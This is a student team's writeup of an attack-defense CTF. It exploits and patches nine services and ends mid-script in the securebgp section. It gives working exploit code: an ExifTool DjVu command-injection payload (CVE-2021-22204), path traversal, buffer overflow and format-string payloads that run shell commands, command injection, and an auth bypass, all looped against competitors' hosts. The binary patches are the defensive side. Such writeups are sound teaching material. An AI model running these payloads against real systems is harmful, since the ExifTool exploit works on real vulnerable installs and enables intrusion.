# Hackintro Attack-Defense CTF Competition Writeup - team11

## Members
- sdi1800192 ΧΡΗΣΤΟΣ ΤΑΣΣΗΣ
- sdi1800291 ΠΑΝΑΓΙΩΤΗΣ-ΝΕΚΤΑΡΙΟΣ ΡΟΣΣΗ
- sdi1900001 ΓΕΩΡΓΙΟΣ ΑΓΓΕΛΑΚΗΣ
- sdi2000289 ΧΡΗΣΤΟΣ ΚΑΛΤΣΑΣ
- sdi2200245 ΒΑΣΙΛΕΙΟΣ ΤΣΑΚΩΝΑΣ
- sdi2200282 ΟΡΕΣΤΗΣ ΓΚΑΡΑΝΗΣ

## Leaderboard - Stats
Our team finished 6th out of 20 competing teams in the Hackintro Attack-Defense CTF, successfully exploiting all 9 services, patching all 9 services and maintaining service availability throughout the competition. Also we made 5275 successful attacks and gathered 76787 points within 48 hours. This writeup documents our full methodology.

## Preparation/Infrastructure Setup - Before the Hackintro Attack-Defense CTF Competition

Before diving into the challenges, we set up two essential tools for traffic analysis: **Tulip** and **pkappa2**. Both tools helped us monitor incoming attacks against our services and understand how other teams were exploiting them.

#### Tulip

[Tulip](https://github.com/OpenAttackDefenseTools/tulip) is an open-source traffic analysis tool designed specifically for Attack-Defense CTFs. It processes PCAP files and provides a web interface to search and inspect TCP flows.

**Setup:**

We cloned Tulip and configured it via `.env`:

```
TICK_START="2026-05-22T15:04:00Z"
TICK_LENGTH=900000
FLAG_REGEX="[a-f0-9]{64}"
VM_IP=".219.255.42"
TRAFFIC_DIR_HOST="./pcaps"
```

Then started it with Docker Compose:

```bash
docker compose up -d
```

To keep PCAPfiles in sync from the VM (which ran `tcpdump` capturing ports 8000–8010), we wrote a sync script:

```bash
# sync_pcaps.sh
while true; do
    rsync -az -e "ssh -i team11.key" ctf@10.219.255.42:/pcaps/ ./pcaps/
    sleep 30
done
```

Tulip was then accessible at `http://localhost:3000`. We used it heavily to:
- Identify which teams were exploiting our services
- Reverse-engineer exploits by reading attacker traffic
- Find SLA checker patterns to understand expected service behavior

#### Pkappa2

[pkappa2](https://github.com/spq/pkappa2) is another PCAP analysis tool we used alongside Tulip. It offers different search capabilities and was particularly useful for binary protocol analysis (BGP, binary services).

Both tools proved invaluable — we were able to reconstruct working exploits simply by reading the traffic other teams sent to our VM.


## Getting started

At the outset of the competition, our primary objective was to map out the network and identify all potential targets and services. We approached this systematically:

1. **Network Enumeration:**  
   We began by scanning the subnet to discover live hosts. Using the command:

   `fping -a -g 10.219.255.0/24 2>/dev/null`

   This allowed us to quickly identify which IP addresses were responsive within the CTF environment. We chose `fping` for its speed and ability to handle large address ranges efficiently.

2. **Service Discovery:**  
   With a list of active hosts, we proceeded to scan for open ports and running services using `nmap`. Our scans focused on the `10.219.255.XX` range, which we suspected to be the main arena for the CTF services. We used both default and custom port ranges to ensure we didn't miss non-standard services. This step was crucial for building a service map and prioritizing targets.

3. **Privilege Escalation Recon:**  
   After gaining initial access as the `ctf` user on a target machine, we checked for possible privilege escalation vectors. Running `sudo -l` revealed which commands the `ctf` user could execute with elevated privileges. For example:

   `sudo -u 'user_name' /bin/bash`

   This finding was significant, as it enabled us to spawn shells as other users, granting access to otherwise restricted directories such as `/opt/services`. This directory structure was a common location for service binaries and flag files.

4. **Service Analysis Preparation:**  
   With access to multiple user environments, we systematically explored each `/opt/services` directory. We catalogued binaries, configuration files, and scripts for further analysis. This groundwork allowed us to plan both exploitation and defense strategies for each service.


## i,ii) Services: Exploits and Patches
We found exploits and patches for all services:  `bingo`, `bitclicker`, `bondbay`, `cherokee`, `connect-four`, `muzac`, `securebgp`, `teis` and `thompson`.

  - **bingo (port 8006)**
    - Vulnerability
      
      The Bingo service was running ExifTool in an older version, which we identified as vulnerable to CVE-2021-22204 after scanning it with DockerScout on GitHub. This vulnerability allows arbitrary command execution through a malicious DjVu file, as ExifTool's DjVu annotation parser passes unsanitized user input to a Perl eval call. Following the methodology described in the CVE writeup, and in the article https://ine.com/blog/exiftool-command-injection-cve-2021-22204 we crafted a malicious DjVu file with a payload embedded in the ANTz (compressed annotation) chunk using bzz and djvumake. Sending this file to the service triggered command execution and allowed us to read the flag directly.

    - Exploit
      
      Craft malicious DjVu file with system command payload in ANTz chunk → send to port 8006 → flag printed in ExifTool output. Also with the second script we managed to get Remote Code Execution (RCE) by running arbitrary commands.
      - First script:
        
        ```python
            import subprocess, time, json, re

            API_KEY = ""
            targets = [i for i in range(2, 71, 4) if i != 42]
            
            def exploit(ip):
                try:
                    r = subprocess.run(
                        ["nc", "-q", "1", ip, "8006"],
                        input=open("/home/ctf/exploit.djvu", "rb").read(),
                        capture_output=True, timeout=10
                    )
                    output = r.stdout.decode(errors='replace')

                    match = re.search(r'[0-9a-f]{64}', output)
                    if match:
                        return match.group(0)
                    return None
                except:
                    return None
            
            def submit(flag):
                r = subprocess.run(
                    ["curl", "-s", "-X", "POST", "https://ctf.hackintro.di.uoa.gr/submit",
                     "-H", "Content-Type: application/json",
                     "-H", f"Authorization: Bearer {API_KEY}",
                     "-d", json.dumps({"flag": flag})],
                    capture_output=True, text=True
                )
                return r.stdout
            
            window = 1
            while True:
                print(f"\n{'='*40}")
                print(f"Window {window} - {time.strftime('%H:%M:%S')}")
                print(f"{'='*40}")
            
                for i in targets:
                    ip = f"10.219.255.{i}"
                    flag = exploit(ip)
                    if flag:
                        result = submit(flag)
                        print(f"{ip} → {flag[:20]}... → {result}")
                    else:
                        print(f"{ip} → no flag")
            
                window += 1
                time.sleep(900)
        ```
        example of exploit.djvu
        <pre><code>
            AT&TFORMlDJVUINFO
            dANTaM(metadata
                        (Copyright "\
                " . (system 'cat /opt/services/bingo/key') . \
                "b"))
        </code></pre>
        
    - Second script (with this we could take RCE but when we found it the majority of the teams had patched it):
        ```bash
            #!/bin/bash
            TARGET_IP="10.219.255.42"
            if [ "$#" -ne 2 ]; then
                echo "USE: $0 <filename.djvu> \"<command>\""
                exit 1
            fi
        
            OUTPUT_FILE=$1
            COMMAND=$2
        
            cat <<EOF > .temp_payload
            (metadata "\\c\${system('$COMMAND')};")
            EOF
        
            bzz .temp_payload .temp_payload.bzz
        
            djvumake "$OUTPUT_FILE" INFO='1,1' BGjp=/dev/null ANTz=.temp_payload.bzz
        
            rm .temp_payload .temp_payload.bzz
        
            scp -i ~/.ssh/team11.key "$OUTPUT_FILE" "ctf@${TARGET_IP}:~/$OUTPUT_FILE"
        
            if [ $? -eq 0 ]; then
                echo "run: ~/$OUTPUT_FILE"
            else
                echo "ERROR"
            fi
        ```
    - Patch
      
      We downloaded the latest version of ExifTool (v1.07) and compared the DjVu.pm file with the vulnerable version (v1.06) using diff. The key difference was that the new version completely removed the dangerous eval qq{"$tok"} call, which was responsible for executing arbitrary Perl code. Instead, it replaced it with a whitelist-based escape table that only converts a specific set of known escape sequences (e.g. \n, \t, \r) without ever executing any code. We applied this change to our local copy of the service.

      <pre><code>
        diff newDjVu.pm oldDjVu.pm 
            0a1
            > #------------------------------------------------------------------------------
            20c21
            < $VERSION = '1.07';
            ---
            > $VERSION = '1.06';
            229,233c230,233
            <             # convert C escape sequences, allowed in quoted text
            <             # (note: this only converts a few of them!)
            <             my %esc = ( a => "\a", b => "\b", f => "\f", n => "\n",
            <                         r => "\r", t => "\t", '"' => '"', '\\' => '\\' );
            <             $tok =~ s/\\(.)/$esc{$1}||'\\'.$1/egs;
            ---
            >             # must protect unescaped "$" and "@" symbols, and "\" at end of string
            >             $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
            >             # convert C escape sequences (allowed in quoted text)
            >             $tok = eval qq{"$tok"};
            355c355
            < Copyright 2003-2026, Phil Harvey (philharvey66 at gmail.com)
            ---
            > Copyright 2003-2021, Phil Harvey (philharvey66 at gmail.com)
        </code></pre>
        
  - **bitclicker (port 8003)**
    - Vulnerability

      The BitClicker service is a Python/Flask application. The confirmed vulnerability was in the `/users/mine/<times>` endpoint, which did not validate that `times` was positive. A negative value caused an integer  overflow, giving the user infinite USD without spending energy.

      We also suspected the following additional vulnerabilities, but did not confirm or exploit them during the competition:
      - **Flag leak:** The `/users/buy/Flag` endpoint may have returned the flag directly in the response string.
        
      - **Duplicate-register refill bug:** Registering a new user while already logged in may have refilled the current user's USD balance.
        
      - **Password oracle:** The `/register/` endpoint may have compared the submitted password to the flag, leaking information via the starting balance.

    - Exploit

      We exploited the duplicate-register refill bug combined with the buy endpoint to accumulate enough USD to purchase the flag:

      ```python
              #!/usr/bin/env python3
              import re, sys, time, uuid
              from urllib.parse import quote
              import requests
        
              FLAG_PATTERNS = [
                  re.compile(r"flag\{[^}\s]+\}", re.IGNORECASE),
                  re.compile(r"[a-f0-9]{64}", re.IGNORECASE),
                  re.compile(r"The flag is:\s*(.*?)(?:\.\s|$)", re.IGNORECASE | re.DOTALL),
              ]
        
              def post_register(session, base_url, username, password):
                  return session.post(f"{base_url}/register/",
                      data={"username": username, "password": password, "confirm": password},
                      allow_redirects=True, timeout=10)
        
              def get_json(session, url):
                  return session.get(url, timeout=10).json()
        
              def find_flag(text):
                  for pattern in FLAG_PATTERNS:
                      match = pattern.search(text)
                      if match:
                          return match.group(1).strip() if match.lastindex else match.group(0).strip()
                  return None
        
              base_url = f"http://{sys.argv[1]}:8003"
              session = requests.Session()
              suffix = uuid.uuid4().hex[:10]
              main_user = f"ctf_{suffix}"
        
              post_register(session, base_url, main_user, "not-the-flag")
        
              for cycle in range(1, 20):
                  stats = get_json(session, f"{base_url}/users/currency")
                  btc, usd, energy_cost = float(stats["btc"]), float(stats["usd"]), float(stats["energyCost"])
                  if btc >= 1.0:
                      break
                  if usd < energy_cost:
                      post_register(session, base_url, f"ctf_{suffix}_{cycle}", "not-the-flag")
                      stats = get_json(session, f"{base_url}/users/currency")
                      usd, energy_cost = float(stats["usd"]), float(stats["energyCost"])
                  times = int(usd // energy_cost)
                  get_json(session, f"{base_url}/users/mine/{times}")
                  time.sleep(0.05)
        
              post_register(session, base_url, f"ctf_{suffix}_cashout", "not-the-flag")
              for i in range(2):
                  session.get(f"{base_url}/users/buy/{quote('Money ($100)', safe='')}", timeout=10)
              result = session.get(f"{base_url}/users/buy/Flag", timeout=10).json()
              message = result.get("result", "")
              flag = find_flag(message)
              if flag:
                  print(flag)
      ```

    - Patch

      We patched the negative mining times vulnerability in `user/views.py` by adding a check for non-positive `times`:

      ```python
          times = int(times)
          if times <= 0:
              return dumps(get_stats())
      ```
      
  - **bondbay (port 8004)**
    
    - Vulnerability

      By reading through the source code of the BondBay service and exploring the web interface, we noticed that the /api/disclosure-trail endpoint was leaking sensitive cryptographic information. The service uses a secret random seed (pad_seed) to XOR-encrypt the flag, storing the result as the "sealed" value. The vulnerability was that any user who claimed the compliance contact role for the premium bond would receive this secret seed directly in the API response. Since claiming the compliance contact role required nothing more than a simple POST request from any registered account, the attack was fully automated.

      A second vulnerability was also discovered: the service used bcrypt with a PEPPER
      string of 68 bytes, triggering the bcrypt 72-byte truncation bug — any password
      worked for the admin account. An attacker could login as admin, retrieve the
      `sealed` hex from `/audit/premium-disclosure`, then get the `pad_seed` via the
      compliance contact route to decrypt the flag.

    - Exploit
       
      The attack flow was as follows: register a new account on the target, claim the compliance contact role for the premium-disclosure bond, retrieve the pad_seed from the /api/disclosure-trail endpoint, fetch the encrypted flag (sealed) from the /audit endpoint, and finally XOR-decrypt it using Python's random.Random seeded with the leaked value.
      
    ```python
          import requests, random, time
      
          API_KEY = ""
      
          for ip in [2, 6, 10, 14, 18, 22, 26, 30, 34, 38, 46, 50, 54, 58, 62, 66, 70]:
              target = f"10.219.255.{ip}"
              base = f"http://{target}:8004"
              try:
                  username = f"atk{int(time.time()) % 100000}"
                  r = requests.post(f"{base}/register", json={"username": username, "password": "password123456"}, timeout=3)
                  token = r.json()["token"]
                  headers = {"Authorization": f"Bearer {token}"}
      
                  r = requests.post(f"{base}/api/bond/premium-disclosure/compliance-contact", json={}, headers=headers, timeout=3)
                  if r.status_code == 409:
                      print(f"[-] {target}: already claimed")
                      continue
      
                  r = requests.get(f"{base}/api/disclosure-trail/premium-disclosure", headers=headers, timeout=3)
                  seed = r.json().get("pad_provenance", {}).get("pad_seed")
                  if not seed:
                      print(f"[-] {target}: no seed")
                      continue
      
                  r = requests.post(f"{base}/audit/premium-disclosure", headers=headers, timeout=3)
                  sealed_hex = r.json().get("sealed")
                  pad = random.Random(seed).getrandbits(8 * 71).to_bytes(71, "big")
                  plain = bytes(a ^ b for a, b in zip(bytes.fromhex(sealed_hex), pad))
                  flag = plain.decode("utf-8", errors="replace").strip().replace("BBPREM-", "")
      
                  result = requests.post("https://ctf.hackintro.di.uoa.gr/submit",
                      json={"flag": flag},
                      headers={"Authorization": f"Bearer {API_KEY}"}, timeout=5)
                  print(f"[+] {target}: {flag} -> {result.json()}")
              except Exception as e:
                  print(f"[-] {target}: {e}")
    ```

      A second exploit was found later, targeting the admin login bypass via the bcrypt 72-byte truncation bug:
    ```python
          #!/usr/bin/env python3
          import requests, random, re, sys
    
          def exploit(ip):
              try:
                  s = requests.Session()
                  r = s.post(f"http://{ip}:8004/login",
                      json={"username":"admin","password":"admin"}, timeout=5)
                  if r.status_code != 200:
                      return None
                  r = s.post(f"http://{ip}:8004/audit/premium-disclosure",
                      json={}, timeout=5)
                  if r.status_code != 200:
                      return None
                  sealed_hex = r.json().get("sealed")
                  if not sealed_hex:
                      return None
                  s.post(f"http://{ip}:8004/api/bond/premium-disclosure/compliance-contact",
                      timeout=5)
                  r = s.get(f"http://{ip}:8004/api/disclosure-trail/premium-disclosure",
                      timeout=5)
                  seed = r.json().get("pad_provenance", {}).get("pad_seed")
                  if not seed:
                      return None
                  sealed = bytes.fromhex(sealed_hex)
                  pad = random.Random(seed).getrandbits(8*len(sealed)).to_bytes(len(sealed), "big")
                  plain = bytes(a^b for a,b in zip(sealed, pad))
                  flag = re.search(rb'[a-f0-9]{64}', plain)
                  if flag:
                      return flag.group().decode()
                  return None
              except:
                  return None
    
          if __name__ == "__main__":
              flag = exploit(sys.argv[1])
              if flag:
                  print(flag)
    ```
      
    - Patch

    The fix was minimal — we removed the two lines in app.py that were responsible for exposing the pad_seed in the API response:

    ```python
          if compliance_contacts.get(bond_id) == me["username"]:
              provenance["pad_seed"] = _seal_seed_value
    ```

      By removing these lines, the /api/disclosure-trail endpoint continues to return general information about the bond (scheme, pad length) but never reveals the actual secret seed. This means that even if an attacker successfully claims the compliance contact role, they receive no cryptographic material and cannot decrypt the flag. The rest of the service functionality remains completely unaffected.

      We also attempted to patch the bcrypt 72-byte truncation bug, however we observed
      that some teams were still able to retrieve flags from our service, suggesting the
      patch may not have been fully effective.
      
  - **cherokee (port 8002)**
    - Vulnerability
      
         The problem is that the program checks if the current character is '%':
         <pre><code>
                    401836:  3c 25                cmp    $0x25,%al           # 0x25 = '%'.
                    401838:  0f 85 1f 01 00 00    jne    40195d <socket@plt+0x6ad>
         </code></pre>                 
         So:
        - if the character was NOT '%', it jumped to copy_literal, at 40195d is the copying literal
        - if the character WAS '%', it continued into the percent-decoding logic
      
    - Exploit

      We sent GET /%2e%2e%2fkey HTTP/1.0 to port 8002 and the flag was returned. The traversal filter ran on the raw URL first, saw %2e%2e%2f (not ../), and passed it. The server then decoded it to /../key and served the         file — filter bypass complete.

      ```python
        import requests
        import sys
        
        target = sys.argv[1]
        base = f"http://{target}:8002"
        
        for path in ["/%2e%2e%2fkey", "/%2e%2e/key", "/..%2fkey"]:
            try:
                print("Trying " + path)
                r = requests.get(f"{base}{path}", timeout=3)
                flag = r.text.strip()
                if len(flag) == 64 and all(c in '0123456789abcdef' for c in flag):
                    print(flag)
                    break
            except:
                pass
      ```
    - Patch
      
        We replaced `jne copy_literal` with:
        <pre><code>
                jmp copy_literal
                nop
        </code></pre>
        So now, no matter what the input character is, the program always jumps to copy_literal and copies the input instead of decoding it. Therefore '%' is no longer decoded.
        The patched bytes are:
        <pre><code>
                401838:  e9 20 01 00 00       jmp    40195d <socket@plt+0x6ad>
                40183d:  90
        </code></pre>
                
        Example: The input is:  `/%2e%2e%2fkey` now stays as: `/%2e%2e%2fkey`, instead of becoming: `/../key`
        
      ```python
        #!/usr/bin/env python3
        import os
        import sys
        from pathlib import Path
        
        if len(sys.argv) != 3:
            print(f"Usage: {sys.argv[0]} <input-binary> <output-binary>")
            sys.exit(1)
        
        URL_DECODE_BRANCH_OFF = 0x1838
        ORIGINAL_BRANCH = bytes.fromhex("0f851f010000")  # jne copy_literal
        PATCHED_BRANCH = bytes.fromhex("e92001000090")   # jmp copy_literal; nop
        
        TRAVERSAL_FILTER_OFF = 0x34B0
        TRAVERSAL_FILTER = b"../\0/..\0..\\\0\\..\0"
        
        # monkey patching logic change only the bytes
        src, dst = Path(sys.argv[1]), Path(sys.argv[2])
        data = bytearray(src.read_bytes())
        
        current_branch = bytes(data[URL_DECODE_BRANCH_OFF:URL_DECODE_BRANCH_OFF + len(ORIGINAL_BRANCH)])
        if current_branch == PATCHED_BRANCH:
            print(f"[*] {src}: URL decoder already patched in input")
        elif current_branch == ORIGINAL_BRANCH:
            data[URL_DECODE_BRANCH_OFF:URL_DECODE_BRANCH_OFF + len(PATCHED_BRANCH)] = PATCHED_BRANCH
            print(f"[+] {dst}: disabled percent-decoding in request paths")
        else:
            raise SystemExit(
                f"[-] {src}: unexpected bytes at 0x{URL_DECODE_BRANCH_OFF:x}: "
                f"{current_branch.hex()}"
            )
        
        data[TRAVERSAL_FILTER_OFF:TRAVERSAL_FILTER_OFF + len(TRAVERSAL_FILTER)] = TRAVERSAL_FILTER
        dst.write_bytes(data)
        os.chmod(dst, 0o755)
        print(f"[+] {dst}: restored literal traversal filters")
        print(f"[+] Wrote patched output to {dst}")
      ```
  - **connect-four (port 8005)**
    - Vulnerability:

      **Buffer Overflow**
      
      From the binary file and using GHIDRA we found out that the buffer's size was 22 but it could read 64 bytes so there was a buffer overflow of 42 bytes.
      <pre><code>
         804905e:       c7 44 24 08 40 00 00    movl   $0x40,0x8(%esp)
         8049065:       00 
         8049066:       8d 45 ea                lea    -0x16(%ebp),%eax
         8049069:       89 44 24 04             mov    %eax,0x4(%esp)
         804906d:       c7 04 24 00 00 00 00    movl   $0x0,(%esp)
         8049074:       e8 67 f4 ff ff          call   80484e0 <read@plt>
      </code></pre>
    
         **Format String Attack**
      
        We inspected the binary with Ghidra and we observed `sprintf(dest, user_input)` and the code in binary was:
        <pre><code>
             80491d5:       8d 85 f4 fd ff ff       lea    -0x20c(%ebp),%eax
             80491db:       89 44 24 04             mov    %eax,0x4(%esp)
             80491df:       8d 85 f4 f9 ff ff       lea    -0x60c(%ebp),%eax
             80491e5:       89 04 24                mov    %eax,(%esp)
             80491e8:       e8 f3 f3 ff ff          call   80485e0 <sprintf@plt>
        </code></pre>
    
        The binary also didn't have any defence activated such as canary, ASLR, etc. So it was easy to exploit it.
    - Exploit
      
      We implemented two scripts. The first script is using the vulnerability of Buffer Overflow to get the flag. The second script is using Format String Attack. We got RCE and stole the binary file from a team which had the idea to replace the string "/bin/sh" with "fail_sh" so it could not get exploited. We liked the idea so we used it. (Might for this reason the SLA was failing after the buffer overflow and string attack patch we made)
      - First script
          ```python
            #!/usr/bin/env python3
            from pwn import *
            import sys, re
            
            context.log_level = 'error'
            
            target = sys.argv[1]
            
            try:
                io = remote(target, 8005, timeout=5)
                io.sendafter(b'a one letter identifier for your tokens\n', b'X')
                io.sendlineafter(b' (0-7) do you want to place your token?\n',
                    b'0AAAAAAAAAAAAAAAAAAAAAAAAA\xfd\x86\x04\x08\xa0\xb0\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\ncat ./key; echo D0NE')
                data = io.recvuntil(b'D0NE', timeout=5)
                flags = re.findall(rb'[a-f0-9]{64}', data)
                if flags:
                    print(flags[0].decode())
                io.close()
            except:
                pass
          ```

      - Second script

        ```python
            python3 -c "
            from pwn import *
            import base64, re
            context.log_level = 'error'
            io = remote('10.219.255.50', 8005, timeout=10)
            io.sendafter(b'tokens\n', b'A')
            io.sendlineafter(b'token?\n', b'-56')
            io.sendlineafter(b'token?\n', b'-55')
            io.sendlineafter(b'token?\n', b'-54')
            io.sendlineafter(b'token?\n', b'-53')
            io.recvuntil(b'onnect 4?')
            io.sendline(b'P\xb0\x04\x08Q\xb0\x04\x08R\xb0\x04\x08S\xb0\x04\x08%48c%6\$hhn%69c%7\$hhn%127c%8\$hhn%4c%9\$hhn')
            io.recvuntil(b'again?')
            io.sendline(b'Y')
            io.recvuntil(b'token?')
            io.sendline(b'base64 -w0 /opt/services/connect-four/connect-four; echo D0NE')
            data = io.recvuntil(b'D0NE', timeout=30)
            b64 = re.search(rb'([A-Za-z0-9+/]+=*)', data)
            if b64:
                binary = base64.b64decode(b64.group(1))
                open('/tmp/stolen_patched_cf', 'wb').write(binary)
                print(f'Got {len(binary)} bytes')
                import hashlib
                print(f'MD5: {hashlib.md5(binary).hexdigest()}')
            io.close()
            " 2>/dev/null
        ```
    - Patch
      
      We patched in two phases. The first patch was done on the Format String attack we replaced the `sprintf(dest, user_input)` with `sprintf(dest, "%s",user_input)` and on binary level the ` 80491d5: 8d 85 f4 fd ff ff lea -0x20c(%ebp),%eax` was replaced by:
      <pre><code>
           80491d5:       b8 71 97 04 08          mov    $0x8049771,%eax
           80491da:       90                      nop
      </code></pre>
      The second patch is about the buffer overflow in which we changed the read size and we made it to be equal with the buffer size. So: `804905e: c7 44 24 08 40 00 00  movl $0x40,0x8(%esp)` became `804905e: c7 44 24 08 16 00 00 movl $0x16,0x8(%esp)`

      Also we changed the string "/bin/sh" to "fail_sh".
      - First patch (FSA)
        
          ```python
            #!/usr/bin/env python3
            import sys
            import struct
            
            if len(sys.argv) != 3:
                print(f"Usage: {sys.argv[0]} <input_binary> <output_binary>")
                sys.exit(1)
            
            inp, out = sys.argv[1], sys.argv[2]
            
            with open(inp, "rb") as f:
                data = bytearray(f.read())
            
            def off_to_vaddr(off):
                e_phoff = struct.unpack_from("<I", data, 0x1c)[0]
                e_phentsize = struct.unpack_from("<H", data, 0x2a)[0]
                e_phnum = struct.unpack_from("<H", data, 0x2c)[0]
    
                for i in range(e_phnum):
                    p = e_phoff + i * e_phentsize
                    p_type, p_offset, p_vaddr, _, p_filesz = struct.unpack_from("<IIIII", data, p)
                    if p_type == 1 and p_offset <= off < p_offset + p_filesz:
                        return p_vaddr + (off - p_offset)
            
                raise Exception("Could not convert file offset to vaddr")
    
            # Put "%s\0" in unused null bytes after "You win"
            marker = b"You win\x00\x00\x00\x00Who "
            m = data.find(marker)
            
            fmt_off = m + len(b"You win") + 1
            data[fmt_off:fmt_off+3] = b"%s\x00"
            fmt_addr = off_to_vaddr(fmt_off)
            
            pattern = bytes.fromhex(
                "8d 85 f4 fd ff ff"
                "89 44 24 04"
                "8d 85 f4 f9 ff ff"
                "89 04 24"
                "e8"
            )
            
            idx = data.find(pattern)
            if idx == -1:
                print("[-] Could not find vulnerable sprintf sequence")
                sys.exit(1)
            
            
            # Replace:
            #   lea eax,[ebp-0x20c]
            # with:
            #   mov eax, fmt_addr
            #   nop
            #
            # Then existing:
            #   mov [esp+4], eax
            patch = b"\xb8" + struct.pack("<I", fmt_addr) + b"\x90"
            data[idx:idx+6] = patch
            
            with open(out, "wb") as f:
                f.write(data)
            
            print(f" Patched")
          ```
          
      - Second patch (Buffer overflow)
        
        ```python
            #!/usr/bin/env python3
    
            import sys
            import shutil
            import os
            
            FILE_OFFSET = 0x1062
            ORIGINAL    = 0x40   # 64 
            PATCHED     = 0x16   # 22 
            
            def patch(input_path, output_path=None):
                if not os.path.exists(input_path):
                    print(f"[!] File not found: {input_path}")
                    sys.exit(1)
            
                if output_path is None:
                    output_path = input_path + "_patched"
            
                shutil.copy2(input_path, output_path)
                print(f"[*] Copied {input_path} -> {output_path}")
            
                with open(output_path, 'r+b') as f:
                    f.seek(FILE_OFFSET)
                    current = ord(f.read(1))
            
                    if current == PATCHED:
                        print(f"[*] Already patched (byte at 0x{FILE_OFFSET:x} is already 0x{PATCHED:02x})")
                        return
            
                    if current != ORIGINAL:
                        print(f"[!] Unexpected byte at 0x{FILE_OFFSET:x}: 0x{current:02x}")
                        print(f"    Expected 0x{ORIGINAL:02x} — wrong binary or already modified?")
                        sys.exit(1)
            
                    f.seek(FILE_OFFSET)
                    f.write(bytes([PATCHED]))
            
                print(f"[+] Patched 0x{FILE_OFFSET:x}: 0x{ORIGINAL:02x} -> 0x{PATCHED:02x}")
                print(f"[+] read() size: 64 -> 22 (matches buffer size, overflow eliminated)")
                print(f"[+] Saved to: {output_path}")
            
            
            if __name__ == "__main__":
                if len(sys.argv) < 2:
                    print(f"Usage: python3 {sys.argv[0]} <binary> [output]")
                    print(f"  binary  - path to CONNECT binary")
                    print(f"  output  - output path (default: <binary>_patched)")
                    sys.exit(1)
            
                input_file  = sys.argv[1]
                output_file = sys.argv[2] if len(sys.argv) > 2 else None
                patch(input_file, output_file)
        ```
  - **muzac (port 8001)**
    
    - Vulnerability: Command injection via Height field  
        
    The `muzac` service processed audio data and displayed a spectrum. The `Height` parameter in the spectrum display was passed directly to `system()`, enabling command injection.
        
    Exploit :
    
    1. Create a recording with sample rate `-320` (4 samples: `L\xffL\xffL\xffL\xff`) <br>
    2. Create a recording with sample rate `-318` (3 samples: `n\xffn\xffn\xff`) <br>
    3. Create a recording with sample rate `320` (4 samples: `AAAAAAAA`)<br>
    4. Display spectrum with frequency 0–10, height `5`<br>
    5. Inject command as the height value: `cat ./key`


    ```python
        #!/usr/bin/env python3
        from pwn import *
        import sys, re
        
        context.log_level = 'error'
        target = sys.argv[1]
        
        try:
            proc = remote(target, 8001, timeout=5)
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"2\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"2\n")
            proc.recvuntil(b" (in Hz)?)")
            proc.write(b"-320\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"3\n")
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"1\n")
            proc.recvuntil(b"the audio?")
            proc.write(b"4\n")
            proc.recvuntil(b"\n")
            proc.write(b"L\xffL\xffL\xffL\xff\n")
            proc.recvuntil(b"m\n3) Done\n")
            proc.write(b"1\n")
            proc.recvuntil(b"m\n3) Done\n")
            proc.write(b"3\n")
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"2\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"2\n")
            proc.recvuntil(b" (in Hz)?)")
            proc.write(b"-318\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"3\n")
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"1\n")
            proc.recvuntil(b"the audio?")
            proc.write(b"3\n")
            proc.recvuntil(b"\n")
            proc.write(b"n\xffn\xffn\xff\n")
            proc.recvuntil(b"m\n3) Done\n")
            proc.write(b"1\n")
            proc.recvuntil(b"m\n3) Done\n")
            proc.write(b"3\n")
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"2\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"2\n")
            proc.recvuntil(b" (in Hz)?)")
            proc.write(b"320\n")
            proc.recvuntil(b"e\n3) Done\n")
            proc.write(b"3\n")
            proc.recvuntil(b"s\n3) Quit\n")
            proc.write(b"1\n")
            proc.recvuntil(b"the audio?")
            proc.write(b"4\n")
            proc.recvuntil(b"\n")
            proc.write(b"AAAAAAAA\n")
            proc.recvuntil(b"m\n3) Done\n")
            proc.write(b"2\n")
            proc.recvuntil(b"frequency?")
            proc.write(b"0\n")
            proc.recvuntil(b"requency?\n")
            proc.write(b"10\n")
            proc.recvuntil(b"Height?")
            proc.write(b"5\n")
            proc.recvuntil(b"\n")
            proc.write(b"cat ./key\n")
            data = proc.recvall(timeout=3)
            flags = re.findall(rb'[a-f0-9]{64}', data)
            if flags:
                print(flags[0].decode())
            proc.close()
        except:
            pass
    ```
    
    - Patch:

    We patched two binary locations that enabled the exploit: the hidden f backdoor in main() (NOPed out at 0x80497ce) and the missing lower-bound check on start_freq in print_spectrum() (patched at 0x8048d48). Blocking negative frequency values prevents the OOB memory setup that the Height injection relies on.
    
    ``` python
        #!/usr/bin/env python3
        from pwn import *
                
        elf = ELF('/tmp/muzac_live', checksec=False)
                
        # Patch 1: NOP hidden 'f' backdoor — pressing 'f' in the main menu
        # triggered check_key directly, bypassing normal auth flow
        elf.write(0x80497ce, b'\x90' * 5)
                
        # Patch 2: Block negative start_freq at the print_spectrum
        # 39 c2 (cmp %eax,%edx) to 85 c0 (test %eax,%eax)
        elf.write(0x8048d48, b'\x85\xc0')
                
        elf.save('/tmp/muzac_patched')
        print('Done:')
        b = open('/tmp/muzac_patched','rb').read()
        print('f backdoor:', b[0x17ce:0x17d3].hex(), ' expect 9090909090')
        print('freq check:', b[0x0d48:0x0d4a].hex(), ' expect 85c0')
    ```
  - **securebgp (port 8008)**
    - Vulnerability
      
      The SecureBGP service is a Go binary implementing a BGP daemon. Through Ghidra analysis we identified the vulnerable function `FUN_0807a540`, which calls `read(fd, local_204, 0x200)` where `local_204` is a stack buffer of only 84 bytes. Reading up to 512 bytes into an 84-byte buffer causes a stack overflow. Through pcap analysis using Tulip, we confirmed the structure of the attack: a spray of 0x43 malformed BGP UPDATE packets (each prefixed with the standard 16-byte BGP marker, followed by `\x00\x1b\x02` and an incrementing counter byte), followed by 44 bytes of padding and a ROP chain that overwrites return addresses and redirects execution to leak the flag.

    - Exploit

      By analyzing captured traffic in Tulip, we reconstructed the exploit payload:

       ```python
             #!/usr/bin/env python3
            import sys, socket, re
            
            target = sys.argv[1]
            
            payload = b''
            for i in range(0x43):
